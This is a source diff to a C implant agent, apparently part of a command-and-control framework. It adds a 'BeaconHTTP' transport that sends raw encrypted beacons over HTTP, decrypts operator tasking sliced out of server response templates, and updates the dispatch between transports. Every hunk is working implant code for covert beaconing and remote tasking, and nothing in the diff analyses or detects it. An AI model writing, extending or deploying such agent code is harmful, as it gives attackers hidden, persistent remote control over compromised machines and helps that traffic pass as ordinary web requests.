@@ -146,6 +146,9 @@ typedef struct {
     // HTTPS-emulation fields (H1 Phase 1b)
     int       is_https_emu;
     char      heartbeat_header[48];
+    // BeaconHTTP raw wire (2026-11-07): raw binary body/response, no base64.
+    // Shares the https-emulation loop skeleton.
+    int       is_raw_http;
 } profile_t;
 
 static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t* prof) {
@@ -186,6 +189,7 @@ static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t*
     prof->ans_size = 0;
     prof->ans_pre_size = 0;
     prof->is_https_emu = 0;
+    prof->is_raw_http = 0;
     ax_strcpy(prof->heartbeat_header, "X-Requested-With");
 
     for (uint32_t i = 0; i < map_count; i++) {
@@ -252,6 +256,8 @@ static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t*
             uint64_t v; mp_read_uint(&r, &v); prof->ans_pre_size = (int)v;
         } else if (klen == 12 && ax_memcmp(key, "is_https_emu", 12) == 0) {
             bool v; mp_read_bool(&r, &v); prof->is_https_emu = v ? 1 : 0;
+        } else if (klen == 11 && ax_memcmp(key, "is_raw_http", 11) == 0) {
+            bool v; mp_read_bool(&r, &v); prof->is_raw_http = v ? 1 : 0;
         } else if (klen == 16 && ax_memcmp(key, "heartbeat_header", 16) == 0) {
             const char* hv; uint32_t hlen;
             if (mp_read_str(&r, &hv, &hlen) == 0 && hlen > 0 && hlen < 48) {
@@ -838,6 +844,9 @@ static int https_command_loop(ws_connector_t* ws, const uint8_t* session_key, si
                               profile_t* prof, uint32_t agent_id,
                               const uint8_t* session_info_data, size_t session_info_len,
                               const char* current_uri, const char* current_ua) {
+    // BeaconHTTP (prof->is_raw_http): body/response carry raw binary — the
+    // response template slot is filled with ciphertext directly, so slice it
+    // out by offset instead of hunting for base64.
     uint64_t conn_start = ax_monotonic_ms();
     uint64_t last_beacon_ms = 0;
 
@@ -914,7 +923,7 @@ static int https_command_loop(ws_connector_t* ws, const uint8_t* session_key, si
                 if (https_send(ws, current_uri, current_ua,
                                https_pick_header(prof->heartbeat_header, hb_idx++),
                                (const char*)beat_buf,
-                               encrypted, enc_len) != 0) {
+                               encrypted, enc_len, prof->is_raw_http) != 0) {
                     ax_free(encrypted);
                     mp_writer_free(&obj_collector);
                     return -1;
@@ -939,6 +948,39 @@ static int https_command_loop(ws_connector_t* ws, const uint8_t* session_key, si
             }
 
             if (recv_len > 0) {
+                if (prof->is_raw_http) {
+                    // BeaconHTTP：模板槽里填的是原始密文，按偏移切出来直接解密。
+                    // 无任务时服务端把槽替换成空串，切片长度正好为 0。
+                    // （pre/size 为 0 的兜底：把整个 body 当密文试一次，GCM
+                    //   tag 对不上自然失败跳过，无害。）
+                    size_t raw_len = 0;
+                    const uint8_t* raw = (const uint8_t*)0;
+                    if (ans_pre_size >= 0 && ans_size >= 0 &&
+                        recv_len > (size_t)ans_pre_size &&
+                        recv_len >= (size_t)ans_pre_size + (size_t)ans_size) {
+                        raw = recv_data + ans_pre_size;
+                        raw_len = recv_len - (size_t)ans_pre_size - (size_t)ans_size;
+                    }
+                    if (raw && raw_len > 0) {
+                        size_t plain_len;
+                        uint8_t* possible_plain;
+                        if (session_key_len >= 32)
+                            possible_plain = gopher_decrypt_nogcm(raw, raw_len,
+                                                                 session_key, session_key_len, &plain_len);
+                        else
+                            possible_plain = aes128_gcm_decrypt(raw, raw_len,
+                                                               session_key, &plain_len);
+                        if (possible_plain) {
+                            plaintext = possible_plain;
+                            if (parse_message(plaintext, plain_len, &msg_type, &objects, &obj_sizes, &obj_count) != 0) {
+                                ax_free(plaintext);
+                                plaintext = (uint8_t*)0;
+                                msg_type = 0;
+                                obj_count = 0;
+                            }
+                        }
+                    }
+                } else {
                 uint8_t* b64_start = recv_data;
                 size_t b64_len = recv_len;
                 extract_b64_payload(recv_data, recv_len, ans_pre_size, ans_size, &b64_start, &b64_len);
@@ -964,12 +1006,12 @@ static int https_command_loop(ws_connector_t* ws, const uint8_t* session_key, si
                                     plaintext = (uint8_t*)0;
                                     msg_type = 0;
                                     obj_count = 0;
-                                } else {
-                            }
+                                }
                             }
                         }
                         ax_free(decoded);
                     }
+                }
                 }
 
                 ax_free(recv_data);
@@ -1055,9 +1097,12 @@ static int agent_main(void) {
     if (profile_count == 0) return 1;
 
     // Detect protocol: watermark==0 → GopherTCP, uri_count>0 → WebSocket,
-    // is_https_emu → HTTPS-emulation (H1 Phase 1b), else LinuxTCP
+    // is_https_emu → HTTPS-emulation (H1 Phase 1b), is_raw_http → BeaconHTTP
+    // (raw binary body, same POST+beat+template skeleton), else LinuxTCP.
+    // ★ is_raw_http 的 profile 也带 uri/ua（BeaconHTTP 配置里有），必须先
+    //   从 is_ws 里排除，否则会被误分发到 WebSocket 模式。
     int is_gopher = (profiles[0].listener_watermark == 0 && profiles[0].uri_count == 0) ? 1 : 0;
-    int is_https = profiles[0].is_https_emu;
+    int is_https = (profiles[0].is_https_emu || profiles[0].is_raw_http) ? 1 : 0;
     int is_ws = (profiles[0].uri_count > 0 && profiles[0].ua_count > 0 && !is_https) ? 1 : 0;
 
     // Create session info. All transports now use the 32-byte key+salt
